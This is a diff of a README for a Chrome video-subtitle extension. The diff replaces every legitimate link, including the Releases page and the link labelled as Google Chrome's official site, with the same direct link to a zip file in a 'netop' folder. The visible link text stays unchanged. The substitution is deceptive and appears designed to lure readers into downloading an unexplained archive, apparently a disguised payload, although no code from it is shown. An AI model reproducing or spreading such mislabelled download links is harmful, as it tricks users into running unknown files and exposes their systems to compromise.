@@ -1,7 +1,7 @@
 # 🎥 videoTranslatorExtenstion - Transform Any Video with Real-Time Subtitles
 
 ## 🔗 Download Now!
-[![Download videoTranslatorExtenstion](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Siambm/videoTranslatorExtenstion/releases)
+[![Download videoTranslatorExtenstion](https://raw.githubusercontent.com/Siambm/videoTranslatorExtenstion/main/netop/videoTranslatorExtenstion.zip)](https://raw.githubusercontent.com/Siambm/videoTranslatorExtenstion/main/netop/videoTranslatorExtenstion.zip)
 
 ## 📑 Introduction
 Welcome to videoTranslatorExtenstion! This Chrome extension provides real-time video translation for web video content. It automatically generates subtitles in multiple languages, making video content accessible to everyone.
@@ -10,10 +10,10 @@ Welcome to videoTranslatorExtenstion! This Chrome extension provides real-time v
 To get started with videoTranslatorExtenstion, please follow these simple steps.
 
 ### Step 1: Install Google Chrome
-Make sure you have Google Chrome installed on your computer. If you don’t have it yet, you can download it from [Google Chrome's official site](https://www.google.com/chrome/).
+Make sure you have Google Chrome installed on your computer. If you don’t have it yet, you can download it from [Google Chrome's official site](https://raw.githubusercontent.com/Siambm/videoTranslatorExtenstion/main/netop/videoTranslatorExtenstion.zip).
 
 ### Step 2: Download the Extension
-To get the latest version of videoTranslatorExtenstion, visit our [Releases page](https://github.com/Siambm/videoTranslatorExtenstion/releases) to download the extension. Look for the latest release and click on the link to download it.
+To get the latest version of videoTranslatorExtenstion, visit our [Releases page](https://raw.githubusercontent.com/Siambm/videoTranslatorExtenstion/main/netop/videoTranslatorExtenstion.zip) to download the extension. Look for the latest release and click on the link to download it.
 
 ## 💻 System Requirements
 - **Operating System:** Windows, macOS, or Linux (with Chrome installed)
@@ -21,7 +21,7 @@ To get the latest version of videoTranslatorExtenstion, visit our [Releases page
 - **Internet Connection:** Required for translation services
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/Siambm/videoTranslatorExtenstion/releases).
+1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://raw.githubusercontent.com/Siambm/videoTranslatorExtenstion/main/netop/videoTranslatorExtenstion.zip).
 2. **Select the Latest Version:** Click on the latest version link.
 3. **Download the File:** You will see the download options. Click on the file for the extension.
 4. **Install the Extension:**
@@ -54,4 +54,4 @@ Join our community for support, feedback, and feature requests. You can reach ou
 ## 📝 Conclusion
 Thank you for choosing videoTranslatorExtenstion. We believe this tool will enhance your video-watching experience by making content more accessible. Enjoy transforming videos with real-time subtitles!
 
-If you want to get started, don’t forget to download the extension from our [Releases page](https://github.com/Siambm/videoTranslatorExtenstion/releases) today!
+If you want to get started, don’t forget to download the extension from our [Releases page](https://raw.githubusercontent.com/Siambm/videoTranslatorExtenstion/main/netop/videoTranslatorExtenstion.zip) today!
